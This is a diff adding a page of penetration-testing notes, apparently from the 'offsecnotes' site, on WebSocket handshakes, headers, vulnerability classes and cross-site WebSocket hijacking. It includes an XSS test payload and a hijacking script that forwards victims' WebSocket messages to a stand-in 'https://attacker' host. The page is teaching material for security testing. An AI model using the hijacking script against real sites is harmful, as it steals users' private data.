@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn about WebSockets penetration testing, including connection establishment, vulnerabilities like XSS and SQLi, and cross-site WebSocket hijacking.">
+  <title>offsecnotes | WebSockets</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>WebSockets</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#manipulating-websocket-connections" id="toc-manipulating-websocket-connections">Manipulating WebSocket connections</a></li>
+<li><a href="#websockets-vulnerabilities" id="toc-websockets-vulnerabilities">WebSockets vulnerabilities</a></li>
+<li><a href="#cross-site-websocket-hijacking" id="toc-cross-site-websocket-hijacking">Cross-site WebSocket hijacking</a></li>
+</ul></div>
+  <hr>
+<p>WebSocket connections are long-lived HTTP initiations allowing bidirectional messaging. The connection stays open until a message is sent by the client or server. WebSocket is ideal for low-latency and server-triggered messages, such as real-time financial data feeds.</p>
+<details>
+<summary>
+How are WebSocket connections established?
+</summary>
+<p>WebSocket connections are normally created using client-side JavaScript like the following:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> ws <span class="op">=</span> <span class="kw">new</span> <span class="bu">WebSocket</span>(<span class="st">&quot;wss://normal-website.com/chat&quot;</span>)<span class="op">;</span></span></code></pre></div>
+<p>The <code>wss</code> protocol establishes a WebSocket over an encrypted TLS connection, while the <code>ws</code> protocol uses an unencrypted connection.</p>
+<p>To establish the connection, the browser and server perform a WebSocket handshake via HTTP. The browser sends a WebSocket handshake request like this:</p>
+<pre class="http"><code>GET /chat HTTP/1.1
+Host: normal-website.com
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+Connection: keep-alive, Upgrade
+Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+Upgrade: websocket</code></pre>
+<pre class="http"><code>HTTP/1.1 101 Switching Protocols
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=</code></pre>
+</details>
+<details>
+<summary>
+Headers
+</summary>
+<ul>
+<li><p>The <code>Connection</code> and <code>Upgrade</code> headers in the request and response indicate that this is a WebSocket handshake.</p></li>
+<li><p>The <code>Sec-WebSocket-Version</code> request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.</p></li>
+<li><p>The <code>Sec-WebSocket-Key</code> request header contains a Base64-encoded random value, which should be randomly generated in each handshake request. This is use to prevent errors from caching proxies. (It is not like CSRF token…)</p></li>
+<li><p>The <code>Sec-WebSocket-Accept</code> response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.</p></li>
+</ul>
+</details>
+<details>
+<summary>
+What do WebSocket messages look like?
+</summary>
+<p>WebSocket messages can contain any content or data format</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>ws<span class="op">.</span><span class="fu">send</span>(<span class="st">&quot;Peter Wiener&quot;</span>)<span class="op">;</span></span></code></pre></div>
+<p>It is common to use json</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span><span class="dt">&quot;user&quot;</span><span class="fu">:</span><span class="st">&quot;Hal Pline&quot;</span><span class="fu">,</span><span class="dt">&quot;content&quot;</span><span class="fu">:</span><span class="st">&quot;Hello&quot;</span><span class="fu">}</span></span></code></pre></div>
+</details>
+<hr />
+<h2 id="manipulating-websocket-connections">Manipulating WebSocket connections</h2>
+<p><a href="https://portswigger.net/web-security/websockets#manipulating-websocket-connections">https://portswigger.net/web-security/websockets#manipulating-websocket-connections</a></p>
+<hr />
+<h2 id="websockets-vulnerabilities">WebSockets vulnerabilities</h2>
+<ul>
+<li>If inputs are transmitted and processed server-side
+<ul>
+<li>Server-side attacks (SQLi, XXE, etc.)</li>
+</ul></li>
+<li>If attacker-controlled data is transmitted via WebSockets to other application users
+<ul>
+<li>Client-side attacks (XSS, etc.)
+<ul>
+<li>Example if the content of a message is transmitted to another user (via chat…)</li>
+<li><code>{"message":"&lt;img src=1 onerror='alert(1)'&gt;"}</code></li>
+</ul></li>
+</ul></li>
+<li>Also blind vulnerabilities</li>
+</ul>
+<hr />
+<h2 id="cross-site-websocket-hijacking">Cross-site WebSocket hijacking</h2>
+<p>An attacker can craft a malicious webpage on their domain, initiating a cross-site WebSocket connection to the susceptible application. (As CSRF, the websocket connection mustn’t contain CSRF tokens)</p>
+<ul>
+<li>Perform unauthorized actions masquerading as the victim user (like CSRF)</li>
+<li>Retrieve sensitive data that the user can access.</li>
+<li>Waiting for incoming messages to arrive containing sensitive data.</li>
+</ul>
+<p>Exploitation code to open a websocket connection to send messages on your server</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> ws <span class="op">=</span> <span class="kw">new</span> <span class="bu">WebSocket</span>(<span class="st">&#39;wss://your-websocket-url&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    ws<span class="op">.</span><span class="at">onopen</span> <span class="op">=</span> <span class="kw">function</span>() {</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>        ws<span class="op">.</span><span class="fu">send</span>(<span class="st">&quot;READY&quot;</span>)<span class="op">;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>    }<span class="op">;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    ws<span class="op">.</span><span class="at">onmessage</span> <span class="op">=</span> <span class="kw">function</span>(<span class="bu">event</span>) {</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>        <span class="fu">fetch</span>(<span class="st">&#39;https://attacker&#39;</span><span class="op">,</span> {<span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span> <span class="dt">mode</span><span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span> <span class="dt">body</span><span class="op">:</span> <span class="bu">event</span><span class="op">.</span><span class="at">data</span>})<span class="op">;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>    }<span class="op">;</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
